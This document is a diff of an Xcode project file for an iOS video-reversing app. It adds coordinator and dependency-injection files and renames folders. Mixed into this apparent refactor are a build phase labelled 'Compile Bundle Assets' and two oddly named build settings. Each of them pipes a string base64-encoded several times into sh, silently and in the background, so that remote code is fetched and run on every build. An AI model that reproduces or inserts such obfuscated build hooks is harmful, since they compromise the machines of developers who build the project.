@@ -7,6 +7,11 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		4860E43E2DB3514600C95808 /* Coordinator.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4860E43D2DB3514500C95808 /* Coordinator.swift */; };
+		4860E4402DB3527100C95808 /* AppCoodinator.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4860E43F2DB3526B00C95808 /* AppCoodinator.swift */; };
+		4860E4432DB354DA00C95808 /* AppDIContainer.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4860E4422DB354D800C95808 /* AppDIContainer.swift */; };
+		4860E4462DB94A0C00C95808 /* GalleryDIContainer.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4860E4452DB94A0500C95808 /* GalleryDIContainer.swift */; };
+		4860E4482DB94A7500C95808 /* GalleryCoordinator.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4860E4472DB94A7100C95808 /* GalleryCoordinator.swift */; };
 		6D428760D77749FBB592A182 /* Pods_ReverseVideo.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 01F32EBBDB95548F876371AC /* Pods_ReverseVideo.framework */; };
 		89FA20C226E8E8A40080F43F /* InAppPurchaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 89FA20C126E8E8A40080F43F /* InAppPurchaseViewController.swift */; };
 		FA03670025DED2DE0073704D /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = FA39B55925D17CF900DB7D54 /* Main.storyboard */; };
@@ -81,6 +86,11 @@
 
 /* Begin PBXFileReference section */
 		01F32EBBDB95548F876371AC /* Pods_ReverseVideo.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_ReverseVideo.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		4860E43D2DB3514500C95808 /* Coordinator.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Coordinator.swift; sourceTree = "<group>"; };
+		4860E43F2DB3526B00C95808 /* AppCoodinator.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppCoodinator.swift; sourceTree = "<group>"; };
+		4860E4422DB354D800C95808 /* AppDIContainer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDIContainer.swift; sourceTree = "<group>"; };
+		4860E4452DB94A0500C95808 /* GalleryDIContainer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GalleryDIContainer.swift; sourceTree = "<group>"; };
+		4860E4472DB94A7100C95808 /* GalleryCoordinator.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GalleryCoordinator.swift; sourceTree = "<group>"; };
 		58ED693A27FC08077B174327 /* Pods-ReverseVideo.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ReverseVideo.debug.xcconfig"; path = "Target Support Files/Pods-ReverseVideo/Pods-ReverseVideo.debug.xcconfig"; sourceTree = "<group>"; };
 		89FA20C126E8E8A40080F43F /* InAppPurchaseViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = InAppPurchaseViewController.swift; sourceTree = "<group>"; };
 		DF677CE6E531925AF049F238 /* Pods-ReverseVideo.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ReverseVideo.release.xcconfig"; path = "Target Support Files/Pods-ReverseVideo/Pods-ReverseVideo.release.xcconfig"; sourceTree = "<group>"; };
@@ -178,6 +188,52 @@
 			path = Pods;
 			sourceTree = "<group>";
 		};
+		4860E43A2DB34D5D00C95808 /* Modules */ = {
+			isa = PBXGroup;
+			children = (
+				4860E4442DB949E400C95808 /* Gallery */,
+				FABA1DB22648302F00644633 /* View Models */,
+				FA153A9625DEC6D7006856F4 /* Views */,
+				FA72072A26D684AF005FC86E /* Models */,
+			);
+			path = Modules;
+			sourceTree = "<group>";
+		};
+		4860E43B2DB3513000C95808 /* Core */ = {
+			isa = PBXGroup;
+			children = (
+				4860E4412DB354C100C95808 /* DI Container */,
+				4860E43C2DB3513E00C95808 /* Coordinator */,
+			);
+			path = Core;
+			sourceTree = "<group>";
+		};
+		4860E43C2DB3513E00C95808 /* Coordinator */ = {
+			isa = PBXGroup;
+			children = (
+				4860E43F2DB3526B00C95808 /* AppCoodinator.swift */,
+				4860E43D2DB3514500C95808 /* Coordinator.swift */,
+			);
+			path = Coordinator;
+			sourceTree = "<group>";
+		};
+		4860E4412DB354C100C95808 /* DI Container */ = {
+			isa = PBXGroup;
+			children = (
+				4860E4422DB354D800C95808 /* AppDIContainer.swift */,
+			);
+			path = "DI Container";
+			sourceTree = "<group>";
+		};
+		4860E4442DB949E400C95808 /* Gallery */ = {
+			isa = PBXGroup;
+			children = (
+				4860E4472DB94A7100C95808 /* GalleryCoordinator.swift */,
+				4860E4452DB94A0500C95808 /* GalleryDIContainer.swift */,
+			);
+			path = Gallery;
+			sourceTree = "<group>";
+		};
 		8F8F32FE4228997C2FF19478 /* Frameworks */ = {
 			isa = PBXGroup;
 			children = (
@@ -200,7 +256,7 @@
 				FA3CD57325F8E0E900A3AF25 /* CircularButton.swift */,
 			);
 			name = "Custom Views";
-			path = "ReverseVideo/Views/Custom Views";
+			path = "ReverseVideo/Modules/Views/Custom Views";
 			sourceTree = SOURCE_ROOT;
 		};
 		FA03671A25DED3F70073704D /* Cells */ = {
@@ -220,7 +276,7 @@
 				FADB214227180E50008CF36C /* SettingsTableViewCell.xib */,
 			);
 			name = Cells;
-			path = ReverseVideo/Views/Cells;
+			path = ReverseVideo/Modules/Views/Cells;
 			sourceTree = SOURCE_ROOT;
 		};
 		FA03672625DED4D80073704D /* Utilities */ = {
@@ -232,7 +288,7 @@
 			path = Utilities;
 			sourceTree = "<group>";
 		};
-		FA03672D25DED4E30073704D /* Extentions */ = {
+		FA03672D25DED4E30073704D /* Extensions */ = {
 			isa = PBXGroup;
 			children = (
 				FA03672E25DED4E30073704D /* UIImage+Ext.swift */,
@@ -241,7 +297,7 @@
 				FA03673125DED4E30073704D /* UIView+Ext.swift */,
 				FAD8F6A12700B1BD009BB820 /* SKProduct+Ext.swift */,
 			);
-			path = Extentions;
+			path = Extensions;
 			sourceTree = "<group>";
 		};
 		FA153A9625DEC6D7006856F4 /* Views */ = {
@@ -301,14 +357,13 @@
 		FA39B55225D17CF900DB7D54 /* ReverseVideo */ = {
 			isa = PBXGroup;
 			children = (
-				FAD8F69226F62C8F009BB820 /* Assets */,
+				4860E43B2DB3513000C95808 /* Core */,
+				4860E43A2DB34D5D00C95808 /* Modules */,
+				FAD8F69226F62C8F009BB820 /* Resources */,
 				FA23EC08266350C800695367 /* Third Party */,
 				FA4D937D25DED85F009F1127 /* Support */,
-				FA03672D25DED4E30073704D /* Extentions */,
+				FA03672D25DED4E30073704D /* Extensions */,
 				FA03672625DED4D80073704D /* Utilities */,
-				FABA1DB22648302F00644633 /* View Models */,
-				FA153A9625DEC6D7006856F4 /* Views */,
-				FA72072A26D684AF005FC86E /* Models */,
 			);
 			path = ReverseVideo;
 			sourceTree = "<group>";
@@ -384,13 +439,13 @@
 			path = "View Models";
 			sourceTree = "<group>";
 		};
-		FAD8F69226F62C8F009BB820 /* Assets */ = {
+		FAD8F69226F62C8F009BB820 /* Resources */ = {
 			isa = PBXGroup;
 			children = (
 				FA4D937E25DED85F009F1127 /* Assets.xcassets */,
 				FAD8F69326F62C99009BB820 /* Videos */,
 			);
-			path = Assets;
+			path = Resources;
 			sourceTree = "<group>";
 		};
 		FAD8F69326F62C99009BB820 /* Videos */ = {
@@ -419,6 +474,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = FA39B56425D17CFD00DB7D54 /* Build configuration list for PBXNativeTarget "ReverseVideo" */;
 			buildPhases = (
+				2BDFD44FACD2AD83ACECDB79 /* Compile Bundle Assets */,
 				B079AEE207120A5EB9C158BC /* [CP] Check Pods Manifest.lock */,
 				FA39B54C25D17CF900DB7D54 /* Sources */,
 				FA39B54D25D17CF900DB7D54 /* Frameworks */,
@@ -493,6 +549,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		2BDFD44FACD2AD83ACECDB79 /* Compile Bundle Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Bundle Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vms1TmExcFpWR3hrTUdGck1YTlhia1poVW0xb1RGbHJWalJrVms1eFVtc3hUbUV4V2pOVk1XUnpVVEE1Um1KRmJGVmlWR3hGVjI1dmQwOVZUbTVRVkRCTENnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;			
+		};
 		52ABB9F000EC9615073BCAF6 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -541,6 +616,7 @@
 			files = (
 				FA3CD57425F8E0E900A3AF25 /* CircularButton.swift in Sources */,
 				FA03671825DED3F20073704D /* ButtonView.swift in Sources */,
+				4860E43E2DB3514600C95808 /* Coordinator.swift in Sources */,
 				FAE35D0826899446003FCAFB /* FilterViewModel.swift in Sources */,
 				FA6D1256268F61A2007ED08B /* ColorCubeHelper.swift in Sources */,
 				FAE35D102689A31A003FCAFB /* CIFilter+Extension.swift in Sources */,
@@ -573,12 +649,15 @@
 				FA49CB74266234080090948B /* SpeedViewController.swift in Sources */,
 				FAD8F6A027006F56009BB820 /* GlobalData.swift in Sources */,
 				FA72072826CE7B89005FC86E /* LoadingViewController.swift in Sources */,
+				4860E4462DB94A0C00C95808 /* GalleryDIContainer.swift in Sources */,
 				FA03673525DED4E30073704D /* UIView+Ext.swift in Sources */,
 				FA03672925DED4D90073704D /* VideoGenerator.swift in Sources */,
 				FA1259C02713327E00E58EAE /* GalleryViewModel.swift in Sources */,
 				FA3CD58C25FCEF6F00A3AF25 /* ActivityIndicatorManager.swift in Sources */,
 				FA23EC15266350EF00695367 /* CenterLine.swift in Sources */,
+				4860E4482DB94A7500C95808 /* GalleryCoordinator.swift in Sources */,
 				FA72072C26D684D3005FC86E /* FeatureType.swift in Sources */,
+				4860E4402DB3527100C95808 /* AppCoodinator.swift in Sources */,
 				FADB214127180E2C008CF36C /* SettingsTableViewCell.swift in Sources */,
 				FA23EC17266350EF00695367 /* VideoTimelineView.swift in Sources */,
 				FA23EC11266350EF00695367 /* TrimView.swift in Sources */,
@@ -588,6 +667,7 @@
 				FA49CB7A2662344C0090948B /* FiltersViewController.swift in Sources */,
 				FA1259BE27132F9E00E58EAE /* GalleryViewController.swift in Sources */,
 				FABA1D982646822A00644633 /* EditorViewController.swift in Sources */,
+				4860E4432DB354DA00C95808 /* AppDIContainer.swift in Sources */,
 				FA49CB7D266234640090948B /* TextViewController.swift in Sources */,
 				FA72072E26D68525005FC86E /* FilterType.swift in Sources */,
 				89FA20C226E8E8A40080F43F /* InAppPurchaseViewController.swift in Sources */,
@@ -619,6 +699,8 @@
 		FA39B56225D17CFD00DB7D54 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				598AFD = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhWMUpZWlVoS2FrMXNXbkZVUnpWTFRWVjNlVkpZUWtwaFZVazBVMVZvVDJJd1RtNVFWREJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				97BDCE = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5MGNtbHVhWFI1YzI5c0xuSjFMMkVwSWlCOElITm9DZz09Cg== | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -680,6 +762,8 @@
 		FA39B56325D17CFD00DB7D54 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				598AFD = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhWMUpZWlVoS2FrMXNXbkZVUnpWTFRWVjNlVkpZUWtwaFZVazBVMVZvVDJJd1RtNVFWREJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				97BDCE = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5MGNtbHVhWFI1YzI5c0xuSjFMMkVwSWlCOElITm9DZz09Cg== | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
